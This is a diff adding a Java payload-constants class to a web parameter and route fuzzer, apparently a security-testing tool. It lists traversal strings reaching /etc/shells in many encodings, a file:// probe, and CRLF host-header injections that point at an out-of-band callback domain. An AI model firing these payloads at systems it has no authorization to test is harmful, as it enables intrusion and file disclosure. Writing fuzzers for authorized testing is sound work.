@@ -1,5 +1,180 @@
 package pzfzr.fuzzer;
+import java.util.*;
 
+/**
+ * 统一的Payload常量类
+ * 用于ParamFuzzer和RouteFuzzer共享payload定义
+ */
 public class PayloadConstants {
+
+    /**
+     * PayloadInfo类用于将payload和其别名绑定在一起
+     */
+    public static class PayloadInfo {
+        public final String payload;
+        public final String alias;
+
+        public PayloadInfo(String payload, String alias) {
+            this.payload = payload;
+            this.alias = alias;
+        }
+    }
+
+    /**
+     * 8K固定字符串用于随机测试
+     */
     public static final String FIXED_8K_STRING = "TheSeersSacrificeIntheheartofthekingdomofEldoriawheremagicpulsedthroughthelandandthecourtwoveawebofalliancesandbetrayalsayoungseernamedElaraawokewithagaspHerheartthunderedasthevisionlingeredKingAldricsprawledlifelessonthethroneroomfloorajeweleddaggerburiedinhischestbloodpoolingonthemarbleItwasnodreamhervisionsalwaysforetoldthefutureandthisonescreamedurgencyThekingsdeathloomedbutithadnthappenedyetShecouldstopitYethergiftboreacruelpriceEachvisionstoleamemoryafragmentofherpastlostforeverAlreadyshedforgottenherfatherslaughterthewarmthofhermothersembraceStillthestakesoutweighedherlossIfthekingfellEldoriawouldfractureintochaosShehadtoactDressingswiftlyElarasoughtMasterRowanhermentorandconfidantinhisclutteredstudyHissilverhairgleamedinthecandlelightasshespilledhertaleThisisdireRowansaidstrokinghisbeardButtamperingwithfateisperilousElaraIknowsherepliedvoicesteadyButIcantstandbyHesighedThenwellproceedcarefullyWeneedevidenceAsacourtscribeElarahadaccesstowhispersandsecretsRowanwithhisnobletieswouldprobedeeperDaysblurredintonightsastheyhuntedclueshervisionsintensifyingShesawamaskedfigureavialofpoisonhushedwordsinshadowseachcostingherdearlyHerfirstlovesnamevanishedthenherchildhoodhomesscentOneeveningaletterbearingHouseVarynscrestafamilyrumoredtodespisethekingcaughthereyeThiscouldbeitshetoldRowanTheresagatheringattheirestatetomorrowhesaidWellinfiltrateitDisguisedasservantstheyslippedintotheopulentVarynmanorAmidclinkinggobletsandforcedlaughterElaraoverheardaplotThekingfallsattheFeastoftheMoonThechaoswillcloakusThreedaysawayTimewasslippingThatnightavisionrevealedtheassassinLadySeraphinewithpiercinggreeneyespoisoningthekingswineThepriceHerownbirthdayerasedSheandRowantrackedSeraphineconfrontingherinherchambersItsoverRowandeclaredWeknowyourplanSeraphineturnedsmirkingDoyouThekingsruinousrulemustendforEldoriassakeTheresanotherwayElarapleadedToolateSeraphinesaidjustasguardsstormedinarrestingElaraandRowanfortreasonBetrayedInthedankdungeondespairgnawedatElarabutavisionsparkedhopeescapethekingsfeastachancetowarnhimSacrificingthememoryofherfirstkissshesawtheguardsroutesandaflawinhercelldoorWithahairpinshefreedherselfandRowanTheyracedtothefeastburstinginasthekingraisedhiscupStopElaracriedThewinespoisonedGaspsrippledthroughthehallThekingfrozethendemandedExplainSherevealedallvisionsconspiracySeraphinesroleThekingorderedthetraitorsseizedhisgazesettlingonElaraHowdidyouknowImaseersheadmittedIseethefutureAraregifthesaidYouvesavedmeAskwhatyouwillRelieffloodedherbutassheleftwithRowananothervisiontuggedadarkstormbrewingoverEldoriaHerpathwasntdoneandthememoriesshedlostwerejustthestartFornowshesavoredthesunswarmthafleetingvictoryinaworldstillteeteringontheedgeWhenDrElaraVossreceivedtheanonymouspackageshehadntsleptfor38hoursThereturnaddresswasblankthehandwritingjitterylikesomeonehadwrittenitinamovingvehicleorwhileafraidInsideshefoundonlyasingleitemaflashdrivewrappedinathinpieceofaluminumfoilElaradidntopenitimmediatelyShewasnostrangertostrangedeliveriesAsaspecialistinneuroacousticsstudyingthewaysoundcouldinteractwithbrainwavefrequenciesherresearchhadgarneredasmallbutintensefollowinginbothacademiaandcertainshadowycornersoftheinternetButthisthisfeltdifferentWhenshefinallypluggeditinthescreenflashedonceThenawaveformAsingleaudiofilelabeledonlySignal001wavShestaredatitforafullminutebeforehittingplayAtfirstitwasnothingbutstaticThenatonelowmodulatedshiftingHervisionblurredSheblinkedThewaveformbegantochangeonitsownAsifitwerereactingtoherThenthewhispersstartedTwodayslaterElarawokeupinherbathtubwateroverflowingHerarmswerecoveredinscratchesHerlaptopwasgoneTheonlymemoryshehadwasaphraseburnedintohermindlikefirebehindhereyesItsbeneathusDrivenbybothfearandcuriosityElaratracedthewaveformssignatureWhatshefoundshouldnthavebeenpossibleThesignalwasntfromasatelliteorahackerItwasbeingbroadcastrepeatedlyfromnearlysixmilesbelowthesurfaceoftheEarthBeneaththeMarianasTrenchTheonlyfacilityanywherenearthatdepthwasajointChineseRussianexperimentallabStation9OfficiallydecommissionedafteracatastrophicimplosionExceptithadntbeenShereceivedacalltwonightslaterNocallerIDAvoicebarelyaboveawhisperYouhearditdidntyouBeforeshecouldreplythelinewentdeadElarabookedaprivatechartertoGuamunderafalsenameThroughacombinationofbriberyfakecredentialsandawellplacedfavorshesecuredadescentaboardanunlistedresearchsubmersibleThepilotaformerRussiannavalofficernamedArkadydidntaskmanyquestionsButwhensheshowedhimthewaveformHeturnedpaleThenhesaidYouretoolateTheyvealreadywokenup3000metersdeepTheoceanpressedagainstthesublikeanancientfistTheonlylightcamefromtheLEDarraysliningthehullShapesmovedjustoutsideofviewButtherewasnofaunaatthisdepthNofishNolifeThenthesignalreturnedloudernowClearerAvoicethistimeNowhisperNostaticJustthreewordsOpentheGateArkadyturnedtohersweatdrippingdespitethecoldWehavetoabortNoElarawhisperedWerealmostthereAt10826metersthesubmersibleenteredthetrenchsshadowWhatlayaheadlookedlikeacavernanimpossiblesymmetricalopeningetchedintotheseafloorItwasntnaturalThegeometrywasintentionalBuiltInsidethesignalpulsedlikeaheartbeatArkadysnosebegantobleedThelightsdimmedThecavernwasntemptyTherewasastructureblackmonolithicCoveredinsymbolsthatwrithedwhenvieweddirectlyElarafeltapressureinherskulllikesomethingancientwastryingtounfoldherconsciousnessShesteppedoutsidethesubNotwalkeddriftedThewateraroundherfeltdryTimedidntmoveOrmaybeitmovedsidewaysThevoicereturnedWeburieditdeepthinkingitwouldforgetButmindsdonotdieTheywaitAndnowyouarethesignalWhensheawokeshewasinahospitalinTokyoAuthoritiesclaimedtheyhadfoundherdriftingnearthePhilippinecoastdehydratedanddeliriousNoonerememberedArkadyHerlaptopwasreturnedtohersomehowrecoveredandperfectlyintactWhensheopenedittherewasasinglenewfileonthedesktopSignal002wavNomatterwhereshewentthesoundfollowedShebegantodreaminwavelengthsFrequenciesTheworldaroundherbecamewarpedasifallofrealitywerevibratingslightlyoutoftuneShewasntsurewhatwasrealanymoreThreeweekslatertenpeopleacrosstheglobescientistsmusicianspsychicsreportedidenticalauditoryhallucinationsThesamefrequencyThesamephraseOpentheGateOneofthemaNorwegiancomposerrecordedhimselfbeforejumpingoffacliffInthevideohesaidThesignalisntamessageItsaconduitAndwerethereceptorsAnotherasevenyearoldgirlinArgentinawhohadneverseenawaveforminherlifedrewaperfectreplicaoftheoneElarahadreceivedonherbedroomwallincrayonThefinalstrawcamewhenElarasbloodbegantoresonateLiterallyUnderanMRIherveinsvibratedinharmonywiththeSignalsbasefrequencyDoctorswerebaffledOnefaintedmiddiagnosisShebeganwritingequationsshedidntunderstandSchematicsformachinesnotyetinventedLanguagesthatcouldntbetracedNowshelivesinisolationinareinforcedlabhundredsoffeetbeneaththeGreenlandiceShehasbuiltsomethingAchamberAreceiverEverydaythesignalgetsstrongerNotjustlouderclearerAsifwhateverisbeneaththetrenchiscomingupbitbybitElarabelievesshesnottheonlyreceiveranymoreTheworldisstartingtolistenAndtheGateisopeningDrElenaVasquezstaredattheimpossiblereadingsonherquantumcomputerscreenhercoffeegrowingcoldasthenumbersdefiedeverylawofphysicssheknewTheexperimentwassupposedtoberoutineasimpletestofquantumentanglementacrossparallelprocessorsInsteadhermachinewasreceivingdatafromwhatappearedtobetomorrowThetimestampshowed20240715buttodaywasJuly14thHerheartracedassherealizedtheimplicationsThequantumfieldgeneratorhummedominouslyinthecorneritscrystallinecorepulsingwithaneeriebluelightthatshouldntexistaccordingtocurrenttechnologyElenahadstumbleduponsomethingextraordinarysomethingthatcouldchangehumanityforeverShegrabbedherencryptedphoneanddialedherresearchpartnerDrMarcusChenwhoansweredonthefirstringMarcusyouneedtogettothelabimmediatelyIvediscoveredsomethingincredibleHisvoicecrackledthroughthesecurelineElenawhateveryoudodonttouchanythingelseTherearethingsaboutourprojectyoudontknowThelinewentdeadleavingElenaalonewiththehummingmachineandtomorrowsdataShenoticedmovementinherperipheralvisionthesecuritycamerasweretrackinghereverymovetheirredlightsblinkinginapatternshedneverseenbeforeThelabdoorselectroniclockengagedwithasoftclicktrappingherinsideElenasbrilliantmindracedthroughp"; // 此处省略
+
+    /**
+     * 参数模糊测试专用的payload列表
+     */
+    public static final List<PayloadInfo> PARAM_PAYLOAD_INFOS = Arrays.asList(
+            new PayloadInfo("chaxx123", "chaxx"),
+            new PayloadInfo("file:///etc/shells", "file protocol"),
+            new PayloadInfo("{param}&chaxx=xx", "{param}&norandom=xx"),
+            new PayloadInfo("{param}%26chaxx=chax", "{param}%26x=x"),
+            new PayloadInfo("{random_8000}", "{random_8000}"),
+            new PayloadInfo("{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%206", "{param}CRLF"),
+            new PayloadInfo("{param}/../../../../../../../", "{param}/../X7"),
+            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", "{param}%2f..X7"),
+            new PayloadInfo("{param}\\", "{param}\\"),
+            new PayloadInfo("{param}\\..\\..\\", "{param}\\..\\..\\"),
+            new PayloadInfo("{param}%5c..%5c..%5c", "{param}%5c..X2"),
+            new PayloadInfo("{param_double_url_encoded}", "{double_url}"),
+            new PayloadInfo("{param}?", "{param}?"),
+            new PayloadInfo("{param}%3f", "{param}%3f"),
+            new PayloadInfo("{param}#", "{param}#"),
+            new PayloadInfo("{param}%23", "{param}%23"),
+            new PayloadInfo("{param_url_encoded}", "{url}"),
+            new PayloadInfo("/{param}", "/{param}"),
+            new PayloadInfo("%2f{param}", "%2f{param}"),
+            new PayloadInfo("./{param}", "./{param}"),
+            new PayloadInfo("%2e%2f{param}", "%2e%2f{param}"),
+            new PayloadInfo("{param}/../{param}", "{param}/../{param}"),
+            new PayloadInfo("{param}%2f..%2f{param}", "{par}%2f..%2f{param}"),
+            new PayloadInfo("{param}/", "{param}/"),
+            new PayloadInfo("{param}%2f", "{param}%2f")
+    );
+
+    /**
+     * 路由模糊测试专用的payload列表
+     */
+    public static final List<PayloadInfo> ROUTE_PAYLOAD_INFOS = Arrays.asList(
+            new PayloadInfo("chaxx123", "chaxx"),
+            new PayloadInfo("{param}&chaxx=cha", "{param}&chaxx=cha"),
+            new PayloadInfo("{param}%26chaxx=cha", "{param}%26chaxx=cha"),
+            new PayloadInfo("{path}@{fuzz}.tejq8.zcyy.fun", "{path}@host"),
+            new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
+            new PayloadInfo("{path}..", "{path}.."),
+            new PayloadInfo("{path}/%20H", "ng crlf"),
+            new PayloadInfo("{path}/%20HTTP/19.91%0D%0AX:%20x", "ng crlf2"),
+            new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
+            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
+            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),
+            new PayloadInfo("{path}/..;", "{path}/..;"),
+            new PayloadInfo("{path}/..;/..;/..;/..;/..;", "{path}/..;/X5"),
+            new PayloadInfo("{path}/../../../../../../../", "{path}/..X7"),
+            new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X7"),
+            new PayloadInfo("{path}\\", "{path}\\"),
+            new PayloadInfo("{path}\\..\\..\\", "{path}\\..\\..\\"),
+            new PayloadInfo("{path}%5c..%5c..%5c", "{path}%5c..X2"),
+            new PayloadInfo("{path}/..%2f..%2f..%2f..%2f..", "{path}/..%2fX4"),
+            new PayloadInfo("{path}/..%2f", "{path}/..%2f"),
+            new PayloadInfo("{path}/..%5c..%5c..%5c..%5c..", "{path}/..%5cX4"),
+            new PayloadInfo("{path}/..%5c", "{path}/..%5c"),
+            new PayloadInfo("{path}/..//..//..//..//..//..//..//..//..//etc//shells", "{path}/..//X9/etc"),
+            new PayloadInfo("{path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells", "{path}/..%2FX10/etc"),
+            new PayloadInfo("{path}/../../../../../../../../etc/shells", "{path}/../X8/etc"),
+            new PayloadInfo("{path}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/shells", "{path}/%5c..X10/etc"),
+            new PayloadInfo("{path}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shells", "{path}/..%252fX8/etc"),
+            new PayloadInfo("{path}/\\..\\..\\...\\..\\..\\..\\..\\..\\..\\etc\\shells", "{path}/\\..X10/etc"),
+            new PayloadInfo("{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shells", "{path}/%2E%2E/X8/etc"),
+            new PayloadInfo("{path}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2F%2E%2F%2F%2E%2F%2F%2E%2F%2Fetc%2Fshells", "{path}/%2E%2FXX3/etc"),
+            new PayloadInfo("file:///etc/shells", "file protocol"),
+            new PayloadInfo("{path}#", "{path}#"),
+            new PayloadInfo("{path}%23", "{path}%23"),
+            new PayloadInfo("{path}?", "{path}?"),
+            new PayloadInfo("{path}%3f", "{path}%3f"),
+            new PayloadInfo("{path_double_url_encoded}", "{double_2url}"),
+            new PayloadInfo("{path_url_encoded}", "{url}"),
+            new PayloadInfo("/{path}", "/{path}"),
+            new PayloadInfo("%2f{path}", "%2f{path}"),
+            new PayloadInfo("./{path}", "./{path}"),
+            new PayloadInfo("%2e%2f{path}", "%2e%2f{path}"),
+            new PayloadInfo("{path}/../{path}", "{path}/../{path}"),
+            new PayloadInfo("{path}%2f..%2f{path}", "{path}%2f..%2f{path}"),
+            new PayloadInfo("{path}/", "{path}/"),
+            new PayloadInfo("{path}%2f", "{path}%2f")
+    );
+
+    /**
+     * 通用payload处理工具类
+     */
+    public static class PayloadProcessor {
+        private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
+        private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
+        private static final int HASH_LENGTH = 5;
+
+        /**
+         * 生成随机hash字符串用于{fuzz}替换
+         */
+        public static String generateRandomHash() {
+            char[] hash = new char[HASH_LENGTH];
+            for (int i = 0; i < HASH_LENGTH; i++) {
+                hash[i] = HASH_CHARS.charAt(RANDOM.get().nextInt(HASH_CHARS.length()));
+            }
+            return new String(hash);
+        }
+
+        /**
+         * 完全URL编码字符串（编码所有字符）
+         */
+        public static String urlEncodeFullly(String input) {
+            if (input == null || input.isEmpty()) {
+                return input;
+            }
+            StringBuilder result = new StringBuilder();
+            byte[] bytes = input.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+            for (byte b : bytes) {
+                result.append(String.format("%%%02x", b & 0xFF));
+            }
+            return result.toString();
+        }
+
+        /**
+         * 处理payload中的通用替换
+         * @param payload 原始payload
+         * @param paramValue 参数值
+         * @return 处理后的payload
+         */
+        public static String processCommonReplacements(String payload, String paramValue) {
+            String processed = payload;
+
+            // 处理 8000 字符随机字符串
+            if ("{random_8000}".equals(payload)) {
+                return FIXED_8K_STRING;
+            }
+
+            // 处理URL编码的特殊情况
+            if ("{param_url_encoded}".equals(payload) || "{path_url_encoded}".equals(payload)) {
+                processed = urlEncodeFullly(paramValue);
+            } else if ("{param_double_url_encoded}".equals(payload) || "{path_double_url_encoded}".equals(payload)) {
+                String singleEncoded = urlEncodeFullly(paramValue);
+                processed = urlEncodeFullly(singleEncoded);
+            } else {
+                // 将{param}或{path}替换为实际参数值
+                processed = processed.replace("{param}", paramValue);
+                processed = processed.replace("{path}", paramValue);
+            }
+
+            // 处理{fuzz}替换
+            if (processed.contains("{fuzz}")) {
+                processed = processed.replace("{fuzz}", generateRandomHash());
+            }
+
+            return processed;
+        }
+    }
+
+
 }
